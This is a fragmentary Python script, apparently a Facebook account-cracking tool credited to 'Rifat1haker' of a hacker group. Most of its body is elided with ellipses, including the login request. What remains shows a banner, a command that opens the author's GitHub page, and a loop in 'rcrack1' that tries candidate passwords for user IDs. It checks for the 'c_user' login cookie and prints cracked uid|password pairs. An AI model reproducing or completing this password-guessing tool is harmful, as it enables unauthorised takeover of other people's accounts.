...
os.system('xdg-open https://github.com/Rifat1haker ')
...
\033[1;94m       [+]        CREATED BY   : Mueid Mursalin Rifat              \033[1;94m[+]

\033[1;94m       [+]        ON GITHUB    : Rifat1haker               \033[1;94m[+]

\033[1;94m       [+]        TEAM         :  M.M.R HACKERS COMMUNITY    \033[1;94m[+]
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mRIFAT\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            ...
            if 'c_user' in log_cookies:
                ...
                print(f"\x1b[38;5;196m[Mueid-CP🥴] {uid}|{ps}")
        ...
        sys.stdout.write(f'\r\033[m[Mueid-OK💖] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
